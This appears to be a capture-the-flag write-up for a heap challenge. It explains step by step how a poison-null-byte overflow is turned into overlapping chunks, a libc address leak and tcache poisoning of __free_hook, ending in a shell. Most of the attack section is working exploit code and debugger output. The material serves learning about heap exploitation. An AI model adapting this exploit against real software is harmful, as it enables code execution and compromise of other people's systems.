# ZER02HERO: ANOTHER POISON NULL BYTE OVERFLOW

Given the vulnerability is an off-by-null error, I’ll focus directly on the core exploit process, similar to my previous write-up. The main idea is to consolidate chunks to overlap a chunk that is in use. This is done by leveraging the overflow to modify chunk metadata, regardless of whether the chunk is free or in use. In this specific exploit, the size field of a free chunk is altered, shrinking its size within the free list. This approach is used multiple times throughout the exploit.

I’ll reference my previous writeup several times to demonstrate how my approach to solving this differed due to the constraints I faced. The biggest challenge was that I couldn’t write null bytes for the input data, as this would cause the input to terminate at the null byte. Additionally, the total number of allocations allowed was limited to 10, which added a slight complication.

Additionally, unlike the binary in my previous writeup, which allowed the user to provide an index for the structure, this one did not. Instead, the index was selected by looping through the list until an index with no structure in the topic list was reached. While this wasn’t a major issue, it was certainly annoying.

Having laid it all out, I’ll detail my approach to solving the challenge.

I start by making three allocations, similar to my previous writeup, but this uses a different approach for consolidation.

```python
add_topic('0vflw1', 0x18, b'ill start slow.', 120)
add_topic('0vflw2', 0x188, b'\x41'*0xf0+p64(0x101), 120)
add_topic('vic.tim', 0x1f0, b'ah shit .....', 12)
```

Here’s the state of the heap after these three allocations. Please pay attention to the data in chunk B (the middle one); I’ll explain its significance in a minute.

![step_1](https://github.com/kaslr/another_null_chal/blob/main/step_1.PNG)

Though not shown here in the output due to formatting, there's the value `0x101` at chunk B’s address + offset `0xf0`. The importance of this will become clear in time. Also note that this value should be `0x100`, but due to the inability to write null bytes, a little creativity is needed. This is what the next allocations and free operations will address.

value @ chunk B addr + offset before:
```python
pwndbg> x/gx 0x55746b553280+0xf0
0x55746b553370: 0x0000000000000101
```

```python
delete_topic(1)
add_topic('0vflw2', 0x188, b'\x41'*0xef, 120)
```
value @ chunk B addr + offset after:
```python
pwndbg> x/gx 0x55746b553280+0xf0
0x55746b553370: 0x0000000000000100
```

Whoa, that’s intriguing! But why does it work? It should be fairly straightforward to figure out. If you’re having trouble understanding, look closely... 

Notice how the first allocation writes `0xf0` bytes, but the second writes `0xef` bytes? Since the binary is little-endian, at offset `0xf0`, we have the value `0x101` after the first allocation. The first byte is `0x01`, but the second writes one byte less. This means the first byte at chunk B address (`0x55746b553280`) plus `0xf0` will have a null byte due to the binary's use of `strcpy`.

```python
for i in range(0, 7):
    add_topic('tcache', 0x180, b'\x42' * 0x30, 10)

for i in range(3, 10):
    delete_topic(i)
```
These next allocations and frees populate the tcache, so subsequent frees of size `0x190` can be put in the unsorted bin. Notice I said `0x190` sized chunks even though I request `0x180` bytes—the additional `0x10` bytes is chunk metadata.

```python
delete_topic(0)
delete_topic(1)
```

Now we free chunk A and chunk B so that chunk B can be placed in the unsorted bin. Take a look at the heap memory layout.

![step_2](https://github.com/kaslr/another_null_chal/blob/main/step_2.PNG)

Chunk C is the consolidating chunk. Notice how its `prev_size` field is set to B's size. In my previous writeup, this was manually done by crafting a fake `prev_size` value. However, due to the inability to write null bytes, it’s impossible to fake the `prev_size` and trigger the overflow into chunk C (which would clear the in-use bit) and allow chunk C to consolidate `prev_size` bytes backwards. Therefore, our target for today is chunk B.

Also, pay attention to chunk B’s size field—`0x190`.

But how does this work? Let’s move on to the next step in the exploit.

```python
add_topic('0vflw1', 0x18, b'\x41'*0x18, 120)
```

Remember, the previous steps involved freeing chunks A and B. Now, I allocate chunk A back and write the maximum number of bytes, `0x18`, triggering the null byte overflow into chunk B. Let’s examine the heap memory after this step.

![step_3](https://github.com/kaslr/another_null_chal/blob/main/step_3.PNG)

Chunk B shrank! That’s exactly what we intended. But what’s the significance of this reduced size? Stay tuned and I’ll show you.

```python
add_topic('vic.tim', 0x80, b'the 128 byte buffer', 12)
add_topic('vic.tim', 0x60, b'the 0x60 byte buffer', 12)
```

These next allocations are from the unsorted bin, exhausting it and leaving us with four chunks relevant to the exploit:

- **A**: Used to shrink B’s size in the free list.
- **B**: Original B chunk, shrunk in the free list and also split to allocate the new C.
- **C**: Chunk to be overlapped after consolidation—the UAF (use-after-free) chunk.
- **D**: Old C, the consolidating chunk.

You might wonder why we shrunk B in the first place when it was in the free list. It’s simply to prevent it from updating chunk C’s `prev_size` field and in-use bit when new allocations are made (C is the new D chunk before we allocated a new C chunk). By shrinking B in the bin, we trick the allocator into updating an offset of our choosing.

You can check the heap after this to see we’ve got a new chunk C. D is below it; it’s not important right now, so I chose not to show it, but know its `prev_size` field holds the value `0x190`, which was B’s initial size.

```python
delete_topic(0)
for i in range(0, 7):
    add_topic('tcache', 0x80, b'\x45' * 0x30, 10)

delete_topic(0)

for i in range(4, 10):
    delete_topic(i)

for i in range(0, 7):
    add_topic('tcache', 0x1f0, b'\x42' * 0x30, 10)

delete_topic(0)
for i in range(4, 10):
    delete_topic(i)

delete_topic(1)
delete_topic(2)

for i in range(0, 7):
    add_topic('tcache', 0x80, b'\x42' * 0x30, 10)
```

We’ve been meticulously manipulating the heap, so we continue with more grooming. As you can see, these allocations populate the `0x90` and `0x200` bytes tcache, but there are also two important frees to examine: `delete_topic(1)` and `delete_topic(2)`. These correspond to chunks B and D. 

If you recall, B’s new size is `0x90` (plus chunk metadata). Having filled the `0x90` tcache, it gets placed in the unsorted bin. The next free is D, whose in-use bit wasn’t set after allocating B and C (the new chunk). This free triggers the consolidation, and we’ve therefore overlapped C while it’s still in use.

The next seven `0x90` allocations are taken from the tcache, and any additional ones would use the unsorted bin. The allocation and frees for the `0x200` chunks ensure that the consolidating chunk is not added to the tcache.

Examining B’s size field shows that we’ve consolidated backwards. Now, it’ll be treated as a large chunk even if C, still in use, lies in this memory region.

![step_5](https://github.com/kaslr/another_null_chal/blob/main/step_5.PNG)

B, C, and D are now a single large chunk. Any use of C at this point would be a use after free. We can leverage this to leak pointers from libc to defeat ASLR.

```python
add_topic('vic.tim', 0x80, b'info l3ak <3 .....', 12)
```
This allocation tricks `malloc` into splitting the large chunk, serving the requested-sized chunk to B, and updating the `fd` and `bk` of the remainder chunk in the bin (chunk C’s data region) to point to the bin header in the `main_arena` struct, which is a structure in libc’s `.data` section. When we then show the contents of chunk C, we’ll be leaking a libc pointer, which can be used to calculate the base address of libc.

```python
show_topic(3)
rcu(b'des:')
main_arena = u64(rcu(b't').ljust(8, b'\x00'))-0x60
libc.address = main_arena - libc.sym['main_arena']
__free_hook = libc.sym['__free_hook']
system = libc.sym['system']
print(f'[+] leaked main_arena struct:= 0x{main_arena:x}')
print(f'[+] aslr defeated ; libc base:= 0x{libc.address:x}')
rcl()
```

```python
[+] leaked main_arena struct:= 0x7fb7f0556c40
[+] aslr defeated ; libc base:= 0x7fb7f016b000
```

```python
delete_topic(8)
add_topic('vic.tim', 0x160, b'__free_hook pois0n? <3 .....', 12)
delete_topic(9)
add_topic('vic.tim', 0x160, b'omg ronnie!!!', 12)
delete_topic(9)
delete_topic(3)
```

Next, we free chunk B (`delete_topic(8)`), which is an important step since this chunk sits right above chunk C. We then allocate a `0x170` byte chunk, call it E (again it's `0x160` plus metadata). Since there's no tcache to service the request, we fall back to the unsorted bin, which happens to be chunk C. Chunks E and C now point to the same memory.

The next allocation (call it X) allows us to have two entries in the `0x170` tcache and update the `fd` of the head node to point to an arbitrary address. We then free chunk C (`delete_topic(3)`) and X so they’re added to the `0x170` tcache.

Here’s the state of the heap after these steps:

![step_6](https://github.com/kaslr/another_null_chal/blob/main/step_6.PNG)

```python
add_topic('vic.tim', 0x88, b'\x49'*0x88, 12)
delete_topic(8)
delete_topic(6)
add_topic('vic.tim', 0x18, b'/bin/sh', 12)
add_topic('vic.tim', 0xf0, p64(__free_hook-0x8), 12)
```

These next allocations and frees are crucial to the tcache poisoning. Having freed chunk B previously, we reallocate it and fill the chunk to its maximum. This overflows a null byte into the size field of the next chunk, which happens to be both C and E! By doing this, we've shrunk the size of E to `0x100`, meaning freeing E would populate the `0x100` tcache.

Why do this? Since C and E point to the same location, we can’t just free C and then E; that would result in a double-free situation. With no option to edit a topic, a bit of creativity is needed. Initially, I considered using the unsorted bin, but that seemed like overkill. Instead, I leveraged the null byte overflow again to shrink the chunk size from `0x170` to `0x100`, so freeing E would populate the appropriate bin—putting the same chunk in two different bins.

Now, all that's left is to get a chunk from the `0x100` tcache, write an address, and this would automatically poison the head node of the `0x170` tcache, effectively pointing its `fd` pointer to an address of our choosing. A good candidate is the hooks, specifically `__free_hook`. There's a slight issue, though—`__free_hook` isn't aligned! But we don’t worry about that. We shift the pointer back 8 bytes, write 8 bytes of garbage and an address we like (e.g., `system`), and any call to free would trigger the hook—granting code execution.

Also, we see a sneaky chunk there with the content `/bin/sh`; that’s our old buddy, chunk A.

```python
delete_topic(1)
delete_topic(2)
add_topic('vic.tim', 0x160, b'to pop a shell , or not to pop a shell?', 12)
add_topic('vic.tim', 0x160, b'\x41'*0x8 + p64(system), 12)

print('[+] overwrote __free_hook with system')
print('[*] popping a shell..')

delete_topic(6)
```

The two frees do nothing other than give us space for two allocations. Then, we make two allocations; we don’t care much about the first, but note that it's chunk C. The second is the prize. The first 8 bytes of that address point to `__morecore_hook`, but we’re interested in the next 8 bytes—`__free_hook`.

We overwrite the hook with `system`, and free chunk A, which is a pointer to the string `/bin/sh`. This triggers `__free_hook`, which effectively calls `system` with `/bin/sh` passed in, ultimately popping a shell!

I had fun with this one, and I hope you, the reader, do too.
